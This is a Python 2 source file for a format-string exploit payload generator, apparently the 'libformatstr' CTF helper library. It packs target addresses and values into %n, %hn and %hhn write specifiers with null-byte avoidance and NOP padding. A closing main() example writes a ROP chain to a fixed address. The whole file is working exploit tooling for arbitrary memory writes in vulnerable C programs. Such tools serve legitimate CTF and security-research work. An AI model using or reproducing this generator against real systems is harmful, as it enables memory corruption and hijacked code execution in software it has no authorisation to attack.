#!/usr/bin/env python
# -*- coding:utf-8 -*-

import sys
import struct
import operator
from collections import OrderedDict


# TODO: group the same words? (need markers) (or they can be displaced without noticing it)

# INPUT for setitem:
# Address:
#   Int/long: 0x08049580
#   Packed: "\x80\x95\x04\x08"
# Value:
#   Int/long: 0xdeadbeef
#   Word(0xdead)
#   Packed: "\xef\xbe\xad\xde\xce\xfa\xad\xde"
#   List of values above: [0xdeadbeef, "sc\x00\x00", "test", Word(0x1337)]
def pack32(n):
    return struct.pack("<I", n)


def pack64(n):
    return struct.pack("<Q", n)


def unpack32(s):
    return struct.unpack("<I", s)[0]


def unpack64(s):
    return struct.unpack("<Q", s)[0]


def pack(n, is64):
    if is64:
        return pack64(n)
    else:
        return pack32(n)


def unpack(s, is64):
    if is64:
        return unpack64(s)
    else:
        return unpack32(s)


class FormatStr:
    def __init__(self, buffer_size=0, isx64=0, autosort=True):
        if autosort:
            self.mem = {}
        else:
            self.mem = OrderedDict()
        self.buffer_size = buffer_size
        self.autosort = autosort
        self.isx64 = isx64
        self.parsers = {
            list: self._set_list,
            str: self._set_str,
            int: self._set_dword,
            long: self._set_dword,
            Word: self._set_word,
            Byte: self._set_byte
        }

    def __setitem__(self, addr, value):
        addr_type = type(addr)
        if addr_type in (int, long):
            if self.isx64:
                addr = addr % (1 << 64)
            else:
                addr = addr % (1 << 32)
        elif addr_type == str:
            addr = unpack(addr, self.isx64)
        else:
            raise TypeError("Address must be int or packed int, not: " + str(addr_type))

        val_type = type(value)
        if val_type == type(self):  # instance...
            val_type = value.__class__

        if val_type in self.parsers:
            return self.parsers[val_type](addr, value)
        else:
            raise TypeError("Unknown type of value: " + str(val_type))

    def __getitem__(self, addr):
        return self.mem[addr]

    def _set_list(self, addr, lst):
        for i, value in enumerate(lst):
            addr = self.__setitem__(addr, value)
        return addr

    def _set_str(self, addr, s):
        for i, c in enumerate(s):
            self._set_byte(addr + i, ord(c))
        return addr + len(s)

    def _set_dword(self, addr, value):
        for i in xrange(4):
            self.mem[addr + i] = (int(value) >> (i * 8)) % (1 << 8)
        return addr + 4

    def _set_word(self, addr, value):
        for i in xrange(2):
            self.mem[addr + i] = (int(value) >> (i * 8)) % (1 << 8)
        return addr + 2

    def word(self, addr, value):
        return self._set_word(addr, value)

    def _set_byte(self, addr, value):
        self.mem[addr] = int(value) % (1 << 8)
        return addr + 1

    def byte(self, addr, value):
        return self._set_byte(addr, value)

    def dword(self, addr, value):
        return self._set_dword(addr, value)

    def payload(self, *args, **kwargs):
        gen = PayloadGenerator(self.mem, self.buffer_size, is64=self.isx64, autosort=self.autosort)
        return gen.payload(*args, **kwargs)


class PayloadGenerator:
    def __init__(self, mem=OrderedDict(), buffer_size=0, is64=0, autosort=True):
        """
        Make tuples like (address, word/dword, value), sorted by value as default.
        Trying to avoid null byte by using preceding address in the case.
        """
        self.is64 = is64
        self.mem = mem
        self.buffer_size = buffer_size
        self.tuples = []
        self.autosort = autosort
        if autosort:
            self.addrs = list(sorted(mem.keys()))  # addresses of each byte to set
        else:
            self.addrs = list(mem.keys())

        addr_index = 0
        while addr_index < len(self.addrs):
            addr = self.addrs[addr_index]
            addr = self.check_nullbyte(addr)

            dword = 0
            for i in range(4):
                if addr + i not in self.mem:
                    dword = -1
                    break
                dword |= self.mem[addr + i] << (i * 8)

            if 0 <= dword < (1 << 16):
                self.tuples.append((addr, 4, dword))
                if self.addrs[addr_index + 2] == addr + 3:
                    addr_index += 3  # backstepped
                elif self.addrs[addr_index + 3] == addr + 3:
                    addr_index += 4
                else:
                    raise ValueError("Unknown error. Missing bytes")
                continue

            word = 0
            for i in range(2):
                if addr + i not in self.mem:
                    word = -1
                    break
                word |= self.mem[addr + i] << (i * 8)

            if 0 <= word < (1 << 16):
                self.tuples.append((addr, 2, word))
                if self.addrs[addr_index] == addr + 1:
                    addr_index += 1  # backstepped
                elif self.addrs[addr_index + 1] == addr + 1:
                    addr_index += 2
                else:
                    raise ValueError("Unknown error. Missing bytes")
                continue
            else:
                if addr_index > 0 and self.addrs[addr_index - 1] > self.addrs[addr_index] - 1:
                    addr_index -= 1  # can't fit one byte, backstepping
                else:
                    self.tuples.append((addr, 1, self.mem[addr]))
                    addr_index += 1
        if autosort:
            self.tuples.sort(key=operator.itemgetter(2))
        return

    def check_nullbyte(self, addr):
        if "\x00" in pack(addr, self.is64):
            # check if preceding address can be used
            if (addr - 1) not in self.mem or "\x00" in pack(addr - 1, self.is64):
                # to avoid null bytes in the last byte of address, set previous byte
                warning("Can't avoid null byte at address " + hex(addr))
            else:
                return addr - 1
        return addr

    def payload(self, arg_index, padding=0, start_len=0):
        """
        @arg_index - index of argument, pointing to payload
        @padding - determing padding size needed to align dwords (padding will be added)
        @start_len - len of already printed data (we can't change this)
        """
        if self.is64:
            align = 8
        else:
            align = 4
        prev_len = -1
        index = arg_index * 10000  # enough for sure
        while True:
            payload = ""
            addrs = ""
            printed = start_len
            for addr, size, value in self.tuples:
                print_len = value - printed
                if print_len < 0:  # Patchs some errors
                    if size == 1:
                        print_len &= 0xff
                    elif size == 2:
                        print_len &= 0xffff
                    elif size == 4:
                        print_len &= 0xffffffff
                if print_len > 2:
                    payload += "%" + str(print_len) + "c"
                elif print_len >= 0:
                    payload += "A" * print_len
                else:
                    warning("Can't write a value %08x (too small) %08x." % (value, print_len))
                    continue

                modi = {
                    1: "hh",
                    2: "h",
                    4: ""
                }[size]
                payload += "%" + str(index) + "$" + modi + "n"
                addrs += pack(addr, self.is64)
                printed += print_len
                index += 1

            payload += "A" * ((padding - len(payload)) % align)
            if len(payload) == prev_len:
                payload += addrs  # argnumbers are set right
                break

            prev_len = len(payload)

            index = arg_index + len(payload) // align

        if "\x00" in payload:
            warning("Payload contains NULL bytes.")
        return payload.ljust(self.buffer_size, "\x90")


class Word:
    def __init__(self, value):
        self.value = value % (1 << 16)

    def __int__(self):
        return self.value


class Byte:
    def __init__(self, value):
        self.value = value % (1 << 8)

    def __int__(self):
        return self.value


def warning(s):
    print >> sys.stderr, "WARNING:", s


def tuples_sorted_by_values(adict):
    """Return list of (key, value) pairs of @adict sorted by values."""
    return sorted(adict.items(), lambda x, y: cmp(x[1], y[1]))


def tuples_sorted_by_keys(adict):
    """Return list of (key, value) pairs of @adict sorted by keys."""
    return [(key, adict[key]) for key in sorted(adict.keys())]


def main():
    # Usage example
    addr = 0x08049580
    rop = [0x080487af, 0x0804873c, 0x080488de]
    p = FormatStr()
    p[addr] = rop

    # buf is 14th argument, 3 bytes padding
    pay = p.payload(14, 3)
    sys.stdout.write(pay)
